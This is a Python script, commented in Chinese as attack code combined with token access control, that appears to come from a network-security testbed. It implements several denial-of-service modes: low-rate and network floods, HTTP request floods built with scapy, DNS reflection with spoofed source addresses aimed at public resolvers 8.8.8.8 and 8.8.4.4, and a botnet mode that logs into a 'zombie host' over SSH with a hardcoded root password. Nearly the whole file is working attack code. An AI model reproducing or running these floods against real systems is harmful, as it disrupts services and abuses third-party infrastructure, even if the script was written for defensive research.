#这是和令牌访问控制融合的攻击代码

from ia_user import *
from ac_user import *
import token_user
import argparse
import time
import random
import threading

def random_authen():
    sqn = random.choice(['2023'])
    key = random.choice(['key1', 'SHX119981015', 'SHX119981015'])
    result = ia_authen(args.User, sqn, key)
    return result

def random_abac():
    resource = random.choice(['owner1'])
    arguments=[["t", args.User, 'owner1', 'r1', token_user.IP, 'beijing', 're2', 'r'],
          ["r", args.User, 'owner1', 'r1', token_user.IP, 'beijing', 're2', 'r']]
    result=token_user.send(arguments,0)
    if result:
        return resource
    else:
        return None

def random_lisp():
    send_data(random.choice(random_port),resource_eid[random.choice(resource_pool)],12345,random_data[random.choice(range(length))])

def random_request():
    request_pool=[1,2,3]
    ia_register(args.User)
    time.sleep(t)
    while flag:
        request=random.choice(request_pool)
        if request==1:
            result=random_authen()
            if result:
                time.sleep(t)
                sm_register('ur',args.User)
                # if not authority_pool:
                #    request_pool.remove(1)
        elif request==2:
            result=random_abac()
            if result:
                if 1 not in request_pool:
                    request_pool.append(1)
                if result not in authority_pool:
                    authority_pool.append(result)
        else:
            random_lisp()
        time.sleep(t)

def LRDDoS():
    global flag
    threading.Thread(target=random_request).start()
    def run():
        global x
        while not authority_pool:
            if not flag:
                return
            time.sleep(10)
        while flag:
            for _ in range(100):
                send_data(random_port[x], resource_eid[random.choice(authority_pool)], 12345, '0'*60000)
                x = x + 1 if x < length - 1 else 0
                time.sleep(0.01)
            time.sleep(15)
    threading.Thread(target=run).start()
    input('输入任意键结束：')
    flag=False

def NetDDoS():
    global flag
    def run():
        global x
        ia_register(args.User)
        time.sleep(3)
        ia_authen(args.User)
        time.sleep(3)
        sm_register('ur',args.User)
        time.sleep(3)
        ac(args.User,resource_pool[0])
        time.sleep(3)
        while flag:
            send_data(random_port[x], resource_eid[random.choice(resource_pool)], 12345, random_data[x])
            x = x + 1 if x < length - 1 else 0
            if SendInterval != 0:
                time.sleep(SendInterval)
    threading.Thread(target=run).start()
    input('输入任意键结束：')
    flag=False


def AppDDoS():
    global flag
    threading.Thread(target=random_request).start()
    def run():
        get_request = r'''GET / HTTP/1.1\r\nHost: %s.com / Connection: close\r\n\r\n'''
        post_request = r'''POST /login HTTP/1.1\r\nHost: %s.com\r\nContent-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n'''+'0'*1000
        put_request = r'''PUT /data.txt HTTP/1.1\r\nHost: %s.com\r\nContent-Length: 10000\r\nConnection: close\r\n\r\n'''+'0'*10000
        delete_request = r'''DELETE /data.txt HTTP/1.1\r\nHost: %s.com\r\nConnection: close\r\n\r\n'''
        head_request = r'''HEAD /index.html HTTP/1.1\r\nHost: %s.com\r\nConnection: close\r\n\r\n'''
        request_list=[get_request,post_request,put_request,delete_request,head_request]
        while flag:
            resource=random.choice(resource_pool)
            request=(request_list[random.choice([0,1,2,3,4])])%resource
            pkt=IP(dst=resource_eid[resource])/TCP(sport=random.choice(range(1024,65535)),dport=80)/request
            send(pkt,verbose=False)
            if SendInterval != 0:
                time.sleep(SendInterval)
    threading.Thread(target=run).start()
    input('输入任意键结束：')
    flag=False

def DRDDoS():
    global flag
    def run():
        ip=['192.168.200.1','192.168.200.4','192.168.200.7']
        while flag:
            for _ in ip:
                pkt=IP(src=ip,dst='8.8.8.8')/UDP(dport=53)/DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0,qd = DNSQR(qname='www.qq.com', qtype=1, qclass=1))
                send(pkt,verbose=False)
                if SendInterval!=0:
                    time.sleep(SendInterval)
            for i in ip:
                pkt=IP(src=ip,dst='8.8.4.4')/UDP(dport=53)/DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0,qd = DNSQR(qname='www.baidu.com', qtype=1, qclass=1))
                send(pkt, verbose=False)
                if SendInterval != 0:
                    time.sleep(SendInterval)
    thread=threading.Thread(target=run,args=())
    thread.start()
    input('输入任意键结束：')
    flag=False


def BNDDoS():
    from pexpect import pxssh
    print('登陆僵尸主机...')
    s=pxssh.pxssh()
    try:
        s.login(psutil.net_if_addrs()['eth0'][0].address,'root','bjtungirc')
    except:
        print('登陆失败，请检查密码...')
        return
    type_map={'1':'NetDDoS','2':'AppDDoS','3':'DRDDoS','4':'LRDDoS'}
    type=input('请输入需要实施的DDoS攻击类型(1:NetDDoS,2:AppDDoS,3:DRDDoS,4:LRDDoS)：')
    while type not in ['1','2','3','4']:
        type = input('请输入需要实施的DDoS攻击类型(1:NetDDoS,2:AppDDoS,3:DRDDoS,4:LRDDoS)：')
    print('发起%s攻击...'%type_map[type])
    cmd='sudo python3 /opt/gopath/src/github.com/hyperledger/fabric/raft_100/malicious_user.py %s %s %s'%(args.User,args.SendInterval,type_map[type])
    print(cmd)
    s.sendline(cmd)
    s.prompt()
    print(s.before.decode())
    string=input('输入任意键结束攻击：')
    s.sendline(string)
    print('注销僵尸主机...')
    s.logout()


if __name__ == '__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('User')
    parser.add_argument('SendInterval')
    parser.add_argument('Type')
    args=parser.parse_args()
    SendInterval=float(args.SendInterval)
    if args.Type != 'BNDDoS':
        from sm_user import *

    authority_pool=[]
    #resource_pool=['owner1','resource2','resource20.1.1.1','resource20.1.2.4','resource20.1.3.7']
    #resource_eid = {'owner1': '20.1.2.5', 'resource2': '20.1.2.6', 'resource20.1.1.1': '20.1.1.1', 'resource20.1.2.4': '20.1.2.4', 'resource20.1.3.7': '20.1.3.7'}
    resource_pool=['owner1']
    resource_eid = {'owner1': '20.1.2.5'}
    t = 0.5
    x = 0
    flag=True

    random_port = list(range(1024, 65535))
    random.shuffle(random_port)

    data_len = list(range(1, 3000))
    length = len(data_len)
    random.shuffle(data_len)
    random_data = []
    for i in data_len:
        random_data.append(''.join(random.choices('''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM)(*&^%$#@!~{}|<>?.,''',k=i)))

    try:
        type=args.Type
    except:
        type=None
    if type=='LRDDoS':
        LRDDoS()
    elif type=='NetDDoS':
        NetDDoS()
    elif type=='AppDDoS':
        AppDDoS()
    elif type=='DRDDoS':
        DRDDoS()
    elif type == 'BNDDoS':
        BNDDoS()
    elif type == 'Request':
        thread=threading.Thread(target=random_request,args=())
        thread.start()
    else:
        thread=threading.Thread(target=random_request,args=())
        thread.start()

        while not authority_pool:
            time.sleep(10)
        while True:
            send_data(random_port[x], resource_eid[random.choice(authority_pool)], 12345, random_data[x])
            x = x + 1 if x < length-1 else 0
            if SendInterval != 0:
                time.sleep(SendInterval)
